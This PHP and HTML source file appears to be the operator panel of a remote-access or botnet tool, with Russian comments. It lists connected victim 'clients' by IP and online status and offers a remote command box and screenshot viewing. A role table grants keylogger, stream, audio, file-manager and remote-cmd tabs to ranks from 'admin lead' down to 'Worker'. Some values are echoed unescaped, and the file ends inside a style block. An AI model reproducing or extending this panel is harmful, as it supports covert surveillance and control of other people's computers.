<?php
session_start();

// Обработка AJAX-запроса для получения только карточек клиентов
if (isset($_GET['ajax']) && $_GET['ajax'] == 1) {
    // Проверка авторизации
    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
        http_response_code(403);
        exit;
    }

    // Загрузка данных
    $dataFile = 'data.json';
    if (file_exists($dataFile)) {
        $data = json_decode(file_get_contents($dataFile), true);
    } else {
        $data = ['clients' => []];
    }

    // Вывод только карточек клиентов
    if(empty($data['clients'])) {
        echo '<p>Нет подключённых клиентов.</p>';
    } else {
        echo '<div class="client-grid">';
        foreach($data['clients'] as $client_id => $client) {
            // Генерация HTML для каждой карточки клиента

            echo '<div class="client-card" id="client-card-'.htmlspecialchars($client_id).'">';
            echo '<div class="client-header">';
            echo '<div class="client-title">';
            echo '<h3><i class="fas fa-desktop"></i>' . htmlspecialchars($client_id) . '</h3>';
            echo '</div>';
            echo '<div class="quick-actions">';
            echo '<button class="btn-icon delete-btn" title="Удалить"><i class="fas fa-trash"></i></button>';
            echo '<button class="btn-icon" title="Данные"><i class="fas fa-database"></i></button>';
            echo '<button class="btn-icon" title="Автостарт"><i class="fas fa-play-circle fa-2x text-info"></i></button>';
            echo '<button class="btn-icon" title="Выключить"><i class="fas fa-power-off"></i></button>';
            echo '</div>';
            echo '</div>';

            echo '<div class="client-info-grid">';
            echo '<div class="info-label" style="font-size:13px; color:#fff;">';
            echo '<div style="display: flex; align-items: center;">';
            echo '<span style="color: #acaeb1;">Описание</span>';
            echo '<button class="edit-description-btn" style="margin-left: 2px; background: none; border: none; cursor: pointer;">';
            echo '<i class="fa-solid fa-circle-plus" style="color: #acaeb1; font-size: 11px;"></i>';
            echo '</button>';
            echo '</div>';
            echo '<div id="description-' . $client_id . '" style="font-weight: normal;">';
            $descriptions = json_decode(file_get_contents('descriptions.json'), true) ?? [];
            echo htmlspecialchars($descriptions[$client_id] ?? 'Компьютер домашний');
            echo '</div>';
            echo '</div>';

            echo '<div class="info-item">';
            echo '<div class="info-label">Активность</div>';
            echo date("H:i", $client['last_seen']);
            echo '</div>';
            echo '<div class="info-item">';
            echo '<div class="info-label">IP адрес</div>';
            echo '<div class="info-label">' . htmlspecialchars($client['ip']) . '</div>';
            echo '</div>';
            echo '<div class="info-item">';
            echo '<div class="info-label">Статус</div>';
            echo (time() - $client['last_seen'] > 60) ? 'Offline' : 'Online';
            echo '</div>';
            echo '</div>';

            echo '<div class="actions-toolbar">';
            echo '<form class="command-input" method="post" action="api.php">';
            echo '<input type="hidden" name="action" value="set_command">';
            echo '<input type="hidden" name="client_id" value="' . $client_id . '">';
            echo '<div class="command-input-group">';
            echo '<input type="text" name="command" placeholder="Введите команду" autocomplete="off">';
            echo '<button type="submit"><i class="fas fa-paper-plane"></i></button>';
            echo '</div>';
            echo '</form>';

            echo '<div class="utility-buttons">';
            echo '<button class="btn-icon" title="Скриншот"><i class="fas fa-camera"></i></button>';
            if (!empty($client['screenshot'])) {
                echo '<button class="btn-icon" onclick="openModal(\'' . $client['screenshot'] . '\')" title="Просмотр"><i class="fas fa-image"></i></button>';
            }
            echo '</div>';
            echo '</div>';
            echo '</div>';
        }
        echo '</div>';
    }
    exit;
}

$client_id = $_SESSION['client_id'] ?? '';
// Получаем роль пользователя из сессии
$userRole = $_SESSION['role'] ?? 'user';

// Определяем доступные вкладки для каждой роли
$rolePermissions = [
    'admin lead' => ['manage', 'history', 'commands', 'control', 'remote-cmd', 'chat', 'fun', 'taskManager', 'files', 'update', 'audio-tab', 'info', 'file_manager', 'stream_view', 'users', 'logout', 'keylogger'],
    'admin' => ['manage', 'history', 'commands', 'control', 'remote-cmd', 'chat', 'fun', 'taskManager', 'files', 'update', 'audio-tab', 'info', 'file_manager', 'stream_view', 'logout', 'keylogger'],
    'Master' => ['manage', 'control', 'chat', 'fun', 'taskManager', 'audio-tab', 'info', 'stream_view', 'logout', 'keylogger'],
    'Worker' => ['manage', 'control', 'chat', 'taskManager', 'info', 'logout', 'stream_view'],
    'Ml. Worker' => ['manage', 'info', 'logout']

];

// Проверка, авторизован ли пользователь
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    header("Location: login.php");
    exit;
}
// index.php

// Обработка AJAX-запросов для управления пользовательскими командами
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd_action'])) {
    $commandsFile = 'user_commands.json';
    if (file_exists($commandsFile)) {
        $commands = json_decode(file_get_contents($commandsFile), true);
        if (!is_array($commands)) {
            $commands = [];
        }
    } else {
        $commands = [];
    }
    $action = $_POST['cmd_action'];
    if ($action === 'get_commands') {
        header('Content-Type: application/json');
        echo json_encode($commands);
        exit;
    } elseif ($action === 'add_command' && isset($_POST['command'])) {
        $newCmd = trim($_POST['command']);
        if ($newCmd !== '') {
            $commands[] = $newCmd;
            file_put_contents($commandsFile, json_encode($commands));
            header('Content-Type: application/json');
            echo json_encode(['status' => 'success', 'commands' => $commands]);
            exit;
        } else {
            header('Content-Type: application/json');
            echo json_encode(['status' => 'error', 'message' => 'Empty command']);
            exit;
        }
    } elseif ($action === 'delete_command' && isset($_POST['index'])) {
        $index = intval($_POST['index']);
        if (isset($commands[$index])) {
            array_splice($commands, $index, 1);
            file_put_contents($commandsFile, json_encode($commands));
            header('Content-Type: application/json');
            echo json_encode(['status' => 'success', 'commands' => $commands]);
            exit;
        } else {
            header('Content-Type: application/json');
            echo json_encode(['status' => 'error', 'message' => 'Invalid index']);
            exit;
        }
    }
    exit;
}

// Загружаем данные о клиентах из файла data.json
$dataFile = 'data.json';
if (file_exists($dataFile)) {
    $data = json_decode(file_get_contents($dataFile), true);
} else {
    $data = ['clients' => []];
}

// Загружаем текущие пользовательские команды (если файл отсутствует, используем пустой массив)
$commandsFile = 'user_commands.json';
if (file_exists($commandsFile)) {
    $userCommands = json_decode(file_get_contents($commandsFile), true);
    if (!is_array($userCommands)) {
        $userCommands = [];
    }
} else {
    $userCommands = [];
}

?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="utf-8">
    <title>Управление клиентами</title>
    <!-- Подключение FontAwesome для иконок -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-primary: #121212;
            --bg-secondary: #121212;
            --accent: #1a1a1a;
            --text-primary: #e0e0e0;
            --text-secondary: #b9bbbe;
            --success: #3ba55c;
            --danger: #ed4245;
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: var(--bg-primary);
            color: var(--text-primary);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        /* Заголовок */
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        /* Вкладки */
        .tabs {
            display: flex;
            margin-bottom: 20px;
            border-bottom: 2px solid var(--bg-secondary);
        }
        .tab {
            padding: 12px 24px;
            cursor: pointer;
            background: var(--bg-secondary);
            border-top-left-radius: 8px;
            border-top-right-radius: 8px;
            margin-right: 5px;
            transition: background-color 0.3s;
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 16px;
        }
        .tab.active {
            background: var(--accent);
        }

        /* Контейнер содержимого вкладок */
        .tab-content {
            background: var(--bg-secondary);
            padding: 20px;
            border-radius: 0 8px 8px 8px;
        }
        /* Сетка карточек клиентов */
        .client-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
        }
        /* Карточка клиента */
        .client-card {
            background: var(--bg-secondary);
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
        }
        .client-card h3 {
            margin-bottom: 10px;
            font-size: 20px;
        }
        .client-info p {
            margin-bottom: 5px;
            font-size: 14px;
            color: var(--text-secondary);
        }
        /* Действия с клиентами */
        .client-actions {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-top: 10px;
        }
        .client-actions form,
        .client-actions button {
    background: var(--accent);
    border: none;
    padding: 8px 14px;
    border-radius: 6px;
    cursor: pointer;
    color: #FFF;
    font-size: 14px;
    transition: background-color 0.3s;
    display: inline-flex; /* Изменено с flex на inline-flex */
    align-items: center;
    justify-content: center; /* Центрируем текст */
    gap: 6px;
    white-space: nowrap; /* Запрещаем перенос текста */
}

        .client-actions form input[type="text"] {
            padding: 6px;
            border: none;
            border-radius: 6px;
            background: #1e1e1e;
            color: #1e1e1e;
        }
        .client-actions form {
    display: flex;
    align-items: center; /* Выравниваем элементы по центру */
    gap: 10px; /* Расстояние между полем ввода и кнопкой */
    width: 75%; /* Занимает всю доступную ширину */
}
.client-actions form input[type="text"] {

}




        h3 {
            font-weight: 500;
            margin-bottom: 20px;
            font-size: 1.4rem;
            color: #ffffff;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .compact-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 12px;
        }

        .btn-group {
            display: flex;
            flex-direction: column;
            gap: 8px;
            padding: 12px;
            border-radius: 8px;
            background-color: rgba(255, 255, 255, 0.03);
        }

        .group-title {
            font-size: 0.8rem;
            color: #a0a0a0;
            margin-bottom: 6px;
            padding-left: 4px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .btn-compact {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 10px 14px;
            background-color: #232323;
            color: #e0e0e0;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.2s ease;
            font-size: 0.9rem;
            text-align: left;
        }

        .btn-compact:hover {
            background-color: #2a2a2a;
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }

        .btn-compact:active {
            transform: translateY(0);
        }

        .btn-icon {
            width: 24px;
            height: 24px;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #bb86fc;
        }

        /* Цвета для разных категорий кнопок */
        .desktop-btn .btn-icon { color: #d0d7d9; }
        .task-btn .btn-icon { color: #d0d7d9; }
        .mouse-btn .btn-icon { color: #d0d7d9; }
        .drabmouse-btn .btn-icon { color: #d0d7d9; }

.client-actions form button[type="submit"] {
    background: var(--accent);
    border: none;
    cursor: pointer;
    color: #FFF;
    font-size: 16px;
    padding: 8px 16px;
    white-space: nowrap; /* Чтобы текст не переносился */
}
        /* Модальное уведомление */
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: var(--success);
            padding: 15px 20px;
            border-radius: 8px;
            z-index: 1100;
            opacity: 0;
            transition: opacity 0.5s, transform 0.5s;
            transform: translateY(-20px);
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .notification.show {
            opacity: 1;
            transform: translateY(0);
        }
        .notification i {
            font-size: 18px;
        }
        /* Модальное окно для скриншота */
        .modal {

            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            max-width: 90%;
            max-height: 90%;
            border-radius: 8px;
        }
        .close {
            position: absolute;
            top: 30px;
            right: 35px;
            color: #FFF;
            font-size: 40px;
            font-weight: bold;
            cursor: pointer;
        }

        /* Стили для управления заготовленными командами */
        .command-manager {
            margin-top: 20px;
        }
        .client-select {
            margin-bottom: 15px;
        }
        .client-select select {
            background: #40444b;
            color: var(--text-primary);
            border: none;
            padding: 8px;
            border-radius: 4px;
        }
        .command-add {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        .command-add input[type="text"] {
            flex-grow: 1;
            padding: 8px;
            border: none;
            border-radius: 4px;
            background: #40444b;
            color: var(--text-primary);
        }
        .command-add button {
            background: var(--accent);
            border: none;
            padding: 8px 12px;
            border-radius: 4px;
            cursor: pointer;
            color: #fff;
            transition: background 0.3s;
        }
        .command-add button:hover {
            background: #4752c4;
        }
        #commandList {
            list-style: none;
            padding: 0;
            margin-bottom: 15px;
        }
        #commandList li {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 20x;
            background: #1a1a1a;
            margin-bottom: 10px;
            border-radius: 20px;
        }
        /* Блок с кнопками для каждой заготовленной команды */
        #commandList li .command-actions {
            display: flex;
            gap: 10px;
        }
        #commandList li .command-actions button {
            background: #121212;
            border: none;
            padding: 6px;
            border-radius: 4px;
            cursor: pointer;
            color: #fff;
            transition: background 0.3s;
        }
        #commandList li .command-actions button:hover {
            background: #40444d;
        }
        .last-output {
    display: block;  /* Убедиться, что стиль применяется */
    width: 300px; /* Укажите нужную ширину */
    overflow: hidden;
    white-space: nowrap;
    text-overflow: ellipsis; /* Добавляет "..." в конце длинного текста */
}



html, body {
    overflow-x: hidden;  /* Убираем горизонтальный скролл */
    overflow-y: scroll;  /* Оставляем вертикальный скролл всегда */
    width: 100vw;
    position: relative;
}
/* Для Webkit-браузеров (Chrome, Edge, Safari) */
::-webkit-scrollbar {
    width: 8px; /* Тонкий ползунок */
    border-radius: 8px; /* Скругление */
}

::-webkit-scrollbar-thumb {
    background: #444; /* Серый ползунок */
    border-radius: 8px; /* Закругляем края */
}

::-webkit-scrollbar-track {
    background: #121212; /* Цвет фона скроллбара */
}




p {
    max-width: 1200px;
    white-space: nowrap; /* Запрет переноса строк */
    overflow: hidden; /* Скрытие лишнего текста */
    text-overflow: ellipsis; /* Добавление "..." в конце */
    max-width: 100%; /* Ограничение ширины */
}

.logout-btn {
    max-width: 1200px;
    display: inline-flex;
    align-items: center;
    margin-top: 15px;
    gap: 8px;
    background: var(--accent);
    color: #fff;
    padding: 10px 16px;
    font-size: 14px;
    font-weight: bold;
    text-decoration: none;
    border-radius: 6px;
    transition: background 0.3s ease, transform 0.2s;
}

.logout-btn:hover {
    background: #4752C4;
    transform: scale(1.05);
}

.logout-btn i {
    font-size: 16px;
}
/* Стили для вкладки файлов */
.file-grid {
    max-width: 1200px;
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
    gap: 15px;
    margin-top: 20px;
}

.file-card {
    max-width: 1200px;
    background: var(--background-secondary);
    border-radius: 8px;
    padding: 15px;
    display: flex;
    flex-direction: column;
    transition: transform 0.2s;
}

.file-card:hover {
    transform: translateY(-3px);
}

.file-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 10px;
}

.file-name {
    font-weight: 500;
    color: var(--text-normal);
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
}

.file-details {
    display: flex;
    justify-content: space-between;
    color: var(--text-muted);
    font-size: 0.9em;
    margin-top: auto;
}

.download-btn {
    background: var(--accent);
    padding: 6px 12px;
    border-radius: 5px;
    text-decoration: none;
    color: white;
    display: flex;
    align-items: center;
    gap: 8px;
}

.download-btn:hover {
    background: #5b6eae;
}
/* Исправленные стили для вкладок */
.tab {
    max-width: 1200px;
    position: relative;
    padding: 12px 24px;
    cursor: pointer;
    background: var(--bg-secondary);
    border-top-left-radius: 8px;
    border-top-right-radius: 8px;
    margin-right: 5px;
    transition: all 0.3s ease;
    display: flex;
    align-items: center;
    gap: 8px;
    border: none;
    color: var(--text-primary);
}

.tab:hover {
    background: var(--accent);
    transform: translateY(-2px);
}

.tab.active {
    background: var(--accent);
    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
}

/* Анимации для карточек файлов */
.file-card {

    transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
}

.file-card:hover {
    transform: translateY(-5px);
    box-shadow: 0 8px 15px rgba(0,0,0,0.2);
}

.download-btn {
    transition: all 0.2s ease;
    opacity: 0.9;
}

.download-btn:hover {
    opacity: 1;
    transform: scale(1.05);
}
.tab.logout-btn {
    margin-left: auto;
    background: var(--danger);
}

.tab.logout-btn:hover {
    background: #c0392b;
    transform: translateY(-2px);
}
/* Стили для карточки клиента */
.client-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
    gap: 20px;
}

.client-card {
    background: var(--bg-secondary);
    border-radius: 12px;
    padding: 20px;
    position: relative;
    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
    transition: transform 0.2s;
}

.client-card:hover {
    transform: translateY(-3px);
}

.client-header {
    display: flex;
    justify-content: space-between;
    align-items: flex-start;
    margin-bottom: 15px;
}

.client-title {
    flex: 1;
    margin-right: 15px;
}

.quick-actions {
    display: flex;
    gap: 8px;
    align-items: center;
}

.client-info-grid {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 10px;
    margin-bottom: 15px;
    padding: 15px;
    background: var(--bg-primary);
    border-radius: 8px;
}

.info-item {
    font-size: 13px;
    line-height: 1.4;
}

.info-label {
    color: var(--text-secondary);
    font-weight: 500;
}

.actions-toolbar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    gap: 10px;
    margin-top: 15px;
}

.command-input {
    flex: 1;
    min-width: 180px;
}

.utility-buttons {
    display: flex;
    gap: 6px;
}

/* Кнопки */
.btn-icon {
    width: 34px;
    height: 34px;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    border-radius: 8px !important;
}

.btn-icon i {
    font-size: 14px;
}

.status-indicator {
    width: 10px;
    height: 10px;
    border-radius: 50%;
    background: #3ba55c;
    margin-left: 8px;
}

.status-offline {
    background: #ed4245;
}
/* Стили для формы ввода команды */
.command-input-group {
    display: flex;
    gap: 8px;
    width: 100%;
    background: var(--bg-primary);
    border-radius: 8px;
    padding: 4px;
    border: 1px solid rgba(255,255,255,0.1);
    transition: all 0.3s ease;
}

.command-input-group:focus-within {
    border-color: var(--accent);
    box-shadow: 0 0 0 2px rgba(88,101,242,0.2);
}

.command-input-group input[type="text"] {
    flex: 1;
    padding: 8px 14px;
    border: none;
    background: transparent;
    color: var(--text-primary);
    font-size: 14px;
    outline: none;
}
.screenshot-file {
    border-left: 4px solid #1a1a1a; /* Синяя полоса для скриншотов */
}

.screenshot-file .file-name {
    color: #1a1a1a; /* Синий цвет для названий скриншотов */
}
.command-input-group input[type="text"]::placeholder {
    color: var(--text-secondary);
    opacity: 0.7;
}

.command-input-group button[type="submit"] {
    background: var(--accent);
    border: none;
    padding: 0 8.4px;
    border-radius: 6px;
    cursor: pointer;
    color: white;
    display: flex;
    align-items: center;
    gap: 2px;
    transition: all 0.2s ease;
}

.command-input-group button[type="submit"]:hover {
    transform: translateY(-1px);
}

.command-input-group button[type="submit"] i {
    font-size: 16px;
    transition: transform 0.2s ease;
}

.command-input-group button[type="submit"]:active i {
    transform: translateY(1px);
}
/* Стили для вкладки файлов */
.file-manager {
    background: #1a1a1a;
    border-radius: 12px;
    padding: 20px;
    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
}

.file-toolbar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 20px;
    padding: 10px;
    background: var(--bg-primary);
    border-radius: 8px;
}

.sort-controls {
    display: flex;
    gap: 10px;
}

.sort-btn {
    background: var(--bg-secondary);
    border: none;
    padding: 8px 16px;
    border-radius: 6px;
    color: var(--text-primary);
    cursor: pointer;
    transition: all 0.2s ease;
}

.sort-btn.active {
    background: var(--accent);
    color: white;
}

.sort-btn:hover {
    background: var(--accent);
    transform: translateY(-1px);
}

.file-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
    gap: 15px;
}

.file-card {
    background: var(--bg-primary);
    border-radius: 12px;
    padding: 16px;
    display: flex;
    flex-direction: column;
    transition: all 0.3s ease;
    border: 1px solid rgba(255,255,255,0.05);
}

.file-card:hover {
    transform: translateY(-3px);
    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
}

.file-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 12px;
}

.file-name {
    font-weight: 500;
    color: var(--text-primary);
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    flex: 1;
}

.file-actions {
    display: flex;
    gap: 6px;
}

.file-action-btn {
    background: transparent;
    border: none;
    color: var(--text-secondary);
    padding: 6px;
    border-radius: 6px;
    cursor: pointer;
    transition: all 0.2s ease;
}

.file-action-btn:hover {
    background: var(--bg-secondary);
    color: var(--text-primary);
}

.file-details {
    display: flex;
    justify-content: space-between;
    color: var(--text-secondary);
    font-size: 13px;
    margin-top: auto;
    padding-top: 12px;
    border-top: 1px solid rgba(255,255,255,0.05);
}

.download-btn {
    width: 100%;
    margin-top: 12px;
    background: var(--accent);
    border: none;
    padding: 10px;
    border-radius: 8px;
    color: white;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    transition: all 0.2s ease;
}

.download-btn:hover {
    background: #4752c4;
    transform: translateY(-1px);
}

.download-btn i {
    font-size: 14px;
}

.empty-state {
    text-align: center;
    padding: 40px;
    color: var(--text-secondary);
}

.empty-state i {
    font-size: 32px;
    margin-bottom: 10px;
}
/* Стили для панели инструментов */
.file-toolbar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 20px;
    padding: 12px;
    background: var(--bg-primary);
    border-radius: 8px;
    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
}

.sort-controls {
    display: flex;
    gap: 8px;
}

.sort-btn {
    background: var(--bg-secondary);
    border: none;
    padding: 8px 16px;
    border-radius: 6px;
    color: var(--text-primary);
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 8px;
    font-size: 14px;
    transition: all 0.2s ease;
}

.sort-btn.active {
    background: var(--accent);
    color: white;
}

.sort-btn:hover {
    background: var(--accent);
    transform: translateY(-1px);
}

.refresh-btn {
    background: var(--accent);
    border: none;
    padding: 8px 16px;
    border-radius: 6px;
    color: white;
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 8px;
    font-size: 14px;
    transition: all 0.2s ease;
}

.refresh-btn:hover {
    background: #40444d;
    transform: translateY(-1px);
}

.refresh-btn:active {
    transform: translateY(0);
}

/* Анимация для кнопки обновления */
@keyframes spin {
    from { transform: rotate(0deg); }
    to { transform: rotate(360deg); }
}

.refresh-btn.loading i {
    animation: spin 1s linear infinite;
}
.notification {
    position: fixed;
    top: 20px;
    right: 20px;
    padding: 12px 20px;
    border-radius: 8px;
    color: white;
    font-size: 14px;
    z-index: 1000;
    opacity: 0;
    transform: translateY(-20px);
    transition: opacity 0.3s, transform 0.3s;
}

.notification.success {
    background: #3ba55c;
}

.notification.error {
    background: #ed4245;
}

.notification.show {
    opacity: 1;
    transform: translateY(0);
}

@keyframes spin {
    from { transform: rotate(0deg); }
    to { transform: rotate(360deg); }
}

.refresh-btn.loading i {
    animation: spin 1s linear infinite;
}


<div class="command-input-group">
    <input type="text"
           name="command"
           placeholder="Введите команду"
           autocomplete="off">
    <button type="submit">
        <i class="fas fa-paper-plane"></i>
        <span class="desktop-text">Отправить</span>
    </button>
</div>
    </style>
<style>
    .command-item {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 10px;
        margin: 5px 0;
        background: #1a1a1a;
        border-radius: 4px;
    }

    .command-name {
        font-weight: bold;

    }

    .command-desc {

        font-size: 0.9em;
        margin-left: 8px;
    }

</style>
<style>
/* Модальное окно */
.modals {
    display: none;
    position: fixed;
    z-index: 1000;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.6);
    backdrop-filter: blur(3px);
    justify-content: center;
    align-items: center;
    animation: fadeIn 0.3s ease;
}

.modals-content {
    background: #1a1a1a;
    padding: 25px;
    border-radius: 12px;
    width: 420px;
    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
    border: 1px solid rgba(255,255,255,0.1);
    transform: translateY(-20px);

}

@keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
}

@keyframes slideDown {
    from { transform: translateY(-40px); opacity: 0; }
    to { transform: translateY(0); opacity: 1; }
}

/* Заголовок и контент */
.modals-content h3 {
    color: #fff;
    margin-bottom: 20px;
    font-size: 1.4rem;
    border-bottom: 1px solid #40444d;
    padding-bottom: 10px;
}

/* Форма */
.form-group {
    margin-bottom: 20px;
}

.form-group label {
    display: block;
    color: #a0a4ab;
    font-size: 0.9rem;
    margin-bottom: 8px;
}

.form-group input[type="text"] {
    width: 100%;
    padding: 10px 15px;
    background: #121212;
    border: 1px solid #40444d;
    border-radius: 6px;
    color: #fff;
    font-size: 0.95rem;
    transition: border-color 0.3s ease;
}

.form-group input[type="text"]:focus {
    border-color: #1a1a1a;
    outline: none;
}

/* Чекбокс */
.form-group label[for="cmdNoDel"] {
    display: flex;
    align-items: center;
    gap: 8px;
    color: #fff;
    cursor: pointer;
}

input[type="checkbox"] {
    width: 16px;
    height: 16px;
    accent-color: #1a1a1a;
}

/* Кнопки */
.modals-actions {
    display: flex;
    justify-content: flex-end;
    gap: 12px;
    margin-top: 25px;
}

.btn-cancel,
.btn-confirm {
    padding: 10px 24px;
    border-radius: 6px;
    font-weight: 500;
    transition: all 0.3s ease;
    cursor: pointer;
}

.btn-cancel {
    background: #1a1a1a;
    color: #fff;
    border: none;
}

.btn-cancel:hover {
    background: #4d515a;
}

.btn-confirm {
    background: rgba(0, 0, 0, 0);
    color: #fff;
    border: none;
}

.btn-confirm:hover {
    transform: translateY(-1px);
}

/* Кнопка добавления */
.btn-add-command {
    background: #1a1a1a;
    color: white;
    border: none;
    padding: 10px 24px;
    border-radius: 6px;
    cursor: pointer;
    font-weight: 500;
    transition: all 0.3s ease;
    display: flex;
    align-items: center;
    gap: 8px;
    margin-left: auto;
    margin-top: 15px;
}

.btn-add-command:hover {
    transform: translateY(-1px);
}

.btn-add-command i {
    font-size: 0.9em;
}

/* Закрытие модалки */
.close {
    position: absolute;
    right: 20px;
    top: 18px;
    color: #a0a4ab;
    font-size: 28px;
    cursor: pointer;
    transition: color 0.3s ease;
}

.close:hover {
    color: #fff;
}
/* Стили для карточек файлов */
.file-card {
    background: var(--bg-primary);
    border-radius: 12px;
    padding: 16px;
    display: flex;
    flex-direction: column;
    transition: all 0.3s ease;
    border: 1px solid rgba(255,255,255,0.05);
}

.file-card:hover {
    transform: translateY(-3px);
    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
}

/* Стили для скриншотов */
.screenshot-file {
    border-left: 4px solid #1a1a1a; /* Синяя полоса для скриншотов */
}

.screenshot-file .file-name {
    color: #1a1a1a; /* Синий цвет для названий скриншотов */
}

/* Контейнер для предпросмотра скриншотов */
.file-preview-container {
    width: 80px;
    height: 80px;
    margin-bottom: 12px;
}

/* Предпросмотр скриншотов */
.file-preview {
    width: 100%;
    height: 100%;
    object-fit: cover;
    border-radius: 8px;
    cursor: pointer;
    transition: transform 0.2s ease;
}

.file-preview:hover {
    transform: scale(1.1);
}

/* Если предпросмотра нет, убираем отступы */
.file-card:not(.screenshot-file) .file-header {
    margin-top: 0;
}
#toast-container {
  position: fixed;
  top: 20px;
  right: 20px;
  z-index: 9999;
  display: flex;
  flex-direction: column;
  gap: 10px;
}
.notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: var(--success);
            padding: 15px 20px;
            border-radius: 8px;
            z-index: 1100;
            opacity: 0;
            transition: opacity 0.5s, transform 0.5s;
            transform: translateY(-20px);
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .notification.show {
            opacity: 1;
            transform: translateY(0);
        }
        .notification i {
            font-size: 18px;
        }
.toast {
  position: relative;
  min-width: 250px;
  padding: 15px 20px;
  border-radius: 8px;
  color: white;
  font-family: Arial;
  opacity: 0;
  transform: translateX(100%);
  animation: slideIn 0.5s ease-out forwards, fadeOut 0.5s ease-in 1.5s forwards;
}

.toast::after {
  content: '';
  position: absolute;
  bottom: 0;
  left: 0;
  width: 100%;
  height: 4px;
  background: rgba(255, 255, 255, 0.3);
  border-radius: 0 0 8px 8px;
  animation: progress 2s linear forwards;
}

.toast.success {
  background: #4CAF50;
}

.toast.error {
  background: #f44336;
}

.toast.info {
  background: #2196F3;
}

@keyframes slideIn {
  from {
    transform: translateX(100%);
  }
  to {
    transform: translateX(0);
    opacity: 1;
  }
}

@keyframes fadeOut {
  from {
    transform: translateX(0);
    opacity: 1;
  }
  to {
    transform: translateX(100%);
    opacity: 0;
  }
}

@keyframes progress {
  from {
    width: 100%;
  }
  to {
    width: 0%;
  }
}
</style>
<style>
    .modal {
        display: none;
        position: fixed;
        z-index: 1000;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0,0,0,0.8);
        justify-content: center;
        align-items: center;
    }

    .modal-content {
        max-width: 90%;
        max-height: 90%;
        border-radius: 4px;
        box-shadow: 0 0 20px rgba(0,0,0,0.5);
    }

    .close-modal {
        position: absolute;
        top: 15px;
        right: 20px;
        font-size: 30px;
        font-weight: bold;
        color: #fff;
        cursor: pointer;
        transition: color 0.3s ease;
        z-index: 1010;
    }

    .close-modal:hover {
        color: #ccc;
    }
</style>
<style>
/* Оверлей */
.description-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.5);
    backdrop-filter: blur(3px);
    z-index: 999;
    display: none;
}
/* Модальные окна */
        .modals {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
        }



        .close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }

        .close:hover {
            color: var(--text-color);
        }

        .form-group {
            margin-bottom: 15px;
        }
/* Само окно */
.description-editor {
display: none;
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
     background-color: rgba(0, 0, 0, 0.7);
    padding: 20px;
    border-radius: 12px;
    box-shadow: 0 5px 32px rgba(0,0,0,0.1);
    z-index: 9000;

    width: 400px;
    border: 1px solid rgba(255,255,255,0.2);
    display: none;
    animation: modalSlide 0.3s ease-out;
}

